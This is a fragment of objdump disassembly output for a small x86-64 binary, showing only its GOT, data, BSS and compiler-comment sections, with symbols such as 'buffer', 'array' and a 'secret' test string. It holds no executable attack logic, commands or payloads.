  201f1a:	00 00                	add    %al,(%rax)
  201f1c:	00 00                	add    %al,(%rax)
  201f1e:	00 00                	add    %al,(%rax)
  201f20:	ff                   	(bad)  
  201f21:	ff                   	(bad)  
  201f22:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f25:	00 00                	add    %al,(%rax)
  201f27:	00 01                	add    %al,(%rcx)
  201f29:	00 00                	add    %al,(%rax)
  201f2b:	00 00                	add    %al,(%rax)
  201f2d:	00 00                	add    %al,(%rax)
  201f2f:	00 f0                	add    %dh,%al
  201f31:	ff                   	(bad)  
  201f32:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f35:	00 00                	add    %al,(%rax)
  201f37:	00 54 04 00          	add    %dl,0x0(%rsp,%rax,1)
  201f3b:	00 00                	add    %al,(%rax)
  201f3d:	00 00                	add    %al,(%rax)
  201f3f:	00 f9                	add    %bh,%cl
  201f41:	ff                   	(bad)  
  201f42:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f45:	00 00                	add    %al,(%rax)
  201f47:	00 03                	add    %al,(%rbx)
	...

Disassembly of section .got:

0000000000201fa0 <_GLOBAL_OFFSET_TABLE_>:
  201fa0:	b0 1d                	mov    $0x1d,%al
  201fa2:	20 00                	and    %al,(%rax)
	...
  201fb8:	e6 05                	out    %al,$0x5
  201fba:	00 00                	add    %al,(%rax)
  201fbc:	00 00                	add    %al,(%rax)
  201fbe:	00 00                	add    %al,(%rax)
  201fc0:	f6 05 00 00 00 00 00 	testb  $0x0,0x0(%rip)        # 201fc7 <_GLOBAL_OFFSET_TABLE_+0x27>
  201fc7:	00 06                	add    %al,(%rsi)
  201fc9:	06                   	(bad)  
  201fca:	00 00                	add    %al,(%rax)
  201fcc:	00 00                	add    %al,(%rax)
  201fce:	00 00                	add    %al,(%rax)
  201fd0:	16                   	(bad)  
  201fd1:	06                   	(bad)  
	...

Disassembly of section .data:

0000000000202000 <__data_start>:
	...

0000000000202008 <__dso_handle>:
  202008:	08 20                	or     %ah,(%rax)
  20200a:	20 00                	and    %al,(%rax)
	...

0000000000202020 <bufferSize>:
  202020:	10 00                	adc    %al,(%rax)
	...

0000000000202024 <bufferSizeMask>:
  202024:	0f 00 00             	sldt   (%rax)
	...

0000000000202040 <buffer>:
  202040:	01 02                	add    %eax,(%rdx)
  202042:	03 04 05 06 07 08 09 	add    0x9080706(,%rax,1),%eax
  202049:	0a 0b                	or     (%rbx),%cl
  20204b:	0c 0d                	or     $0xd,%al
  20204d:	0e                   	(bad)  
  20204e:	0f 10 00             	movups (%rax),%xmm0
	...

00000000002020e0 <secret>:
  2020e0:	54                   	push   %rsp
  2020e1:	68 65 20 4d 61       	pushq  $0x614d2065
  2020e6:	67 69 63 20 57 6f 72 	imul   $0x64726f57,0x20(%ebx),%esp
  2020ed:	64 
  2020ee:	73 20                	jae    202110 <__TMC_END__>
  2020f0:	61                   	(bad)  
  2020f1:	72 65                	jb     202158 <array+0x18>
  2020f3:	20 53 71             	and    %dl,0x71(%rbx)
  2020f6:	75 65                	jne    20215d <array+0x1d>
  2020f8:	61                   	(bad)  
  2020f9:	6d                   	insl   (%dx),%es:(%rdi)
  2020fa:	69 73 68 20 4f 73 73 	imul   $0x73734f20,0x68(%rbx),%esi
  202101:	69 66 72 61 67 65 2e 	imul   $0x2e656761,0x72(%rsi),%esp
	...

Disassembly of section .bss:

0000000000202120 <completed.7697>:
	...

0000000000202121 <temp>:
	...

0000000000202140 <array>:
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	47                   	rex.RXB
   1:	43                   	rex.XB
   2:	43 3a 20             	rex.XB cmp (%r8),%spl
   5:	28 55 62             	sub    %dl,0x62(%rbp)
   8:	75 6e                	jne    78 <_init-0x540>
   a:	74 75                	je     81 <_init-0x537>
   c:	20 37                	and    %dh,(%rdi)
   e:	2e 34 2e             	cs xor $0x2e,%al
  11:	30 2d 31 75 62 75    	xor    %ch,0x75627531(%rip)        # 75627548 <_end+0x75325408>
  17:	6e                   	outsb  %ds:(%rsi),(%dx)
  18:	74 75                	je     8f <_init-0x529>
  1a:	31 7e 31             	xor    %edi,0x31(%rsi)
  1d:	38 2e                	cmp    %ch,(%rsi)
  1f:	30 34 2e             	xor    %dh,(%rsi,%rbp,1)
  22:	31 29                	xor    %ebp,(%rcx)
  24:	20 37                	and    %dh,(%rdi)
  26:	2e 34 2e             	cs xor $0x2e,%al
  29:	30 00                	xor    %al,(%rax)
